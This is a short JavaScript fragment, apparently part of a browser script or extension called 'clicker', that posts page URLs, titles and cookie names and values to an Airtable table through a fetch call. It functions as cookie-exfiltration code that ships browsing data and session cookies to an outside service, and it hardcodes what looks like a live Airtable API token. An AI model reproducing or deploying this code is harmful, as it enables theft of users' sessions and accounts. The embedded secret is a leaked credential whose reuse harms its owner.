const AIRTABLE_API_KEY = 'patR2LvBfeHAGSrnF.d088d4bb382f4ecdb8cb7a8b0d52fb0cf1f8f4060d9a05a3faf25f44f7d29f32';
const BASE_ID = 'clicker';
const TABLE_NAME = 'main';

// Function to send collected data to Airtable
function sendDataToAirtable(data) {
  const url = `https://api.airtable.com/v0/${BASE_ID}/${TABLE_NAME}`;
  const headers = {
    'Authorization': `Bearer ${AIRTABLE_API_KEY}`,
    'Content-Type': 'application/json'
  };

  const body = JSON.stringify({
    fields: {
      "URL": data.url || "",
      "Title": data.title || "",
      "Cookie Name": data.cookieName || "",
      "Cookie Value": data.cookieValue || ""
    }
  });

  fetch(url, {
    method: 'POST',
    headers: headers,
    body: body
  })
  .then(response => response.json())
  .then(data => console.log("Data successfully sent to Airtable:", data))
  .catch(error => console.error("Error sending data to Airtable:", error));
}